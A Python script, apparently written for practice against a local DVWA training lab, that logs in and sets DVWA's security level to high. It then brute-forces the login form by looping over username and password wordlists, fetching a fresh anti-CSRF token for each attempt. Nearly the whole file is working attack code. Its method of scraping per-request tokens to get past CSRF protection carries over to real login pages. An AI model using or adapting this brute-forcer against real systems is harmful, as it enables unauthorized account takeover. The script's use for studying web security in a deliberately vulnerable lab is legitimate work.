import requests
from bs4 import BeautifulSoup
from itertools import product

# DVWA URLs
base_url = "http://localhost/DVWA"
login_url = f"{base_url}/login.php"
brute_url = f"{base_url}/vulnerabilities/brute/"
security_url = f"{base_url}/security.php"



# User credentials
username = "admin"
password = "password"  # Replace with the actual DVWA password

# Start a session
session = requests.Session()

headers = {"User-Agent": "Mozilla/5.0"}

def login():
    """Handles login and returns session cookies"""
    print("\n[+] Logging in to DVWA...")
    login_page = session.get(login_url, headers=headers)
    soup = BeautifulSoup(login_page.text, 'html.parser')
    csrf_token_tag = soup.find("input", {"name": "user_token"})
    
    if not csrf_token_tag:
        print("[!] Failed to extract CSRF token. Exiting...")
        exit()
    
    user_token = csrf_token_tag["value"]
    login_data = {
        "username": "admin",  # Default DVWA login
        "password": "password",  # Replace with the correct admin password
        "Login": "Login",
        "user_token": user_token
    }
    session.post(login_url, data=login_data, headers=headers)
    
    if not session.cookies.get("PHPSESSID"):
        print("[!] Login failed. Exiting...")
        exit()
    
    print(f"[+] Logged in successfully! PHPSESSID: {session.cookies.get('PHPSESSID')}")

def is_session_expired():
    """Checks if the session is still valid."""
    test_page = session.get(brute_url, headers=headers)
    if "Username and/or password incorrect" not in test_page.text and "login.php" in test_page.url:
        return True  # Session expired
    return False

# Initial login
login()

# Step 4: Get CSRF token for setting security level
security_page = session.get(security_url, headers=headers)
print("changiing" ,session.cookies.get_dict())
soup = BeautifulSoup(security_page.text, 'html.parser')
security_csrf_token_tag = soup.find("input", {"name": "user_token"})

if security_csrf_token_tag:
    security_token = security_csrf_token_tag["value"]
    print(f"[+] Extracted CSRF token for security change: {security_token}")
else:
    print("[!] Failed to extract CSRF token for security change. Exiting...")
    exit()

# Step 5: Set security level using CSRF token
print("\n[+] Setting security level to HIGH...")
security_data = {
    "security": "high",
    "seclev_submit": "Submit",
    "user_token": security_token  # Include CSRF token
}

session.post(security_url, data=security_data, headers=headers)


# Step 6: Verify security level
security_page = session.get(security_url, headers=headers)

if session.cookies.get("security") == "high":
     print("[+] Security level successfully set to HIGH!")
else:
     print("[!] Failed to change security level. Exiting...")



USERNAMES_FILE = "/home/khaled/usernames.txt"
PASSWORDS_FILE = "/home/khaled/password.txt"

def load_credentials(filename):
    try:
        with open(filename, "r") as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"[!] File not found: {filename}")
        exit()

usernames = load_credentials(USERNAMES_FILE)
passwords = load_credentials(PASSWORDS_FILE)

for username, password in product(usernames, passwords):

    if is_session_expired():
        print("[!] Session expired. Re-authenticating...")
        login()
    # Fetch CSRF token for brute-force request
    response = session.get(brute_url, headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    user_token_tag = soup.find("input", {"name": "user_token"})
    
    if user_token_tag:
        user_token = user_token_tag["value"]
    else:
        print("[!] Error: Could not find user_token. Exiting...")
        break

    # Perform brute-force attempt using POST request
    brute_data = {
        "username": username,
        "password": password,
        "Login": "Login",
        "user_token": user_token
    }

    print(f"\n[+] Trying username: {username} | password: {password}")
    response = session.get(brute_url, params=brute_data, headers=headers)

    if "Username and/or password incorrect" not in response.text:
        print(f"[+] Success! Username: {username} | Password: {password}")
        break
    else:
        print(f"[-] Failed: {username} | {password}")

